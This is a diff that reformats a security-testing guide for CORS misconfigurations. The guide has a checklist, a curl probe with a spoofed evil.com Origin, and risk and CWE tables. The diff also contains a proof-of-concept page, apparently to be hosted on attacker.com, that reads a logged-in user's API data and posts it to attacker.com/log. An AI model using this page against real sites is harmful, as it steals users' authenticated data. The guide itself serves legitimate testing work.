@@ -1,9 +1,11 @@
 # WSTG-CLNT-07: Testing for Cross-Origin Resource Sharing (CORS)
 
 ## Test ID
+
 WSTG-CLNT-07
 
 ## Test Name
+
 Testing for Cross-Origin Resource Sharing (CORS)
 
 ## High-Level Description
@@ -14,7 +16,7 @@ CORS is a browser mechanism that allows controlled access to resources from diff
 
 ## What to Check
 
-- [ ] Wildcard (*) Access-Control-Allow-Origin
+- [ ] Wildcard (\*) Access-Control-Allow-Origin
 - [ ] Origin reflection without validation
 - [ ] null origin acceptance
 - [ ] Credentials with permissive CORS
@@ -49,22 +51,22 @@ curl -sI -H "Origin: https://target.com.evil.com" "$TARGET" | grep -i "access-co
 <!-- Host this on attacker.com -->
 <!DOCTYPE html>
 <html>
-<body>
-<script>
-    // If CORS allows evil.com, this will work
-    fetch('https://target.com/api/user', {
-        credentials: 'include'
-    })
-    .then(response => response.json())
-    .then(data => {
-        // Send stolen data to attacker
-        fetch('https://attacker.com/log', {
-            method: 'POST',
-            body: JSON.stringify(data)
-        });
-    });
-</script>
-</body>
+  <body>
+    <script>
+      // If CORS allows evil.com, this will work
+      fetch("https://target.com/api/user", {
+        credentials: "include",
+      })
+        .then((response) => response.json())
+        .then((data) => {
+          // Send stolen data to attacker
+          fetch("https://attacker.com/log", {
+            method: "POST",
+            body: JSON.stringify(data),
+          })
+        })
+    </script>
+  </body>
 </html>
 ```
 
@@ -152,18 +154,18 @@ def add_cors_headers(response):
 
 ## Risk Assessment
 
-| Finding | CVSS | Severity |
-|---------|------|----------|
-| CORS with credentials + arbitrary origin | 8.1 | High |
-| Wildcard CORS without credentials | 5.3 | Medium |
-| null origin accepted | 6.5 | Medium |
+| Finding                                  | CVSS | Severity |
+| ---------------------------------------- | ---- | -------- |
+| CORS with credentials + arbitrary origin | 8.1  | High     |
+| Wildcard CORS without credentials        | 5.3  | Medium   |
+| null origin accepted                     | 6.5  | Medium   |
 
 ---
 
 ## CWE Categories
 
-| CWE ID | Title |
-|--------|-------|
+| CWE ID      | Title                                                 |
+| ----------- | ----------------------------------------------------- |
 | **CWE-942** | Permissive Cross-domain Policy with Untrusted Domains |
 
 ---
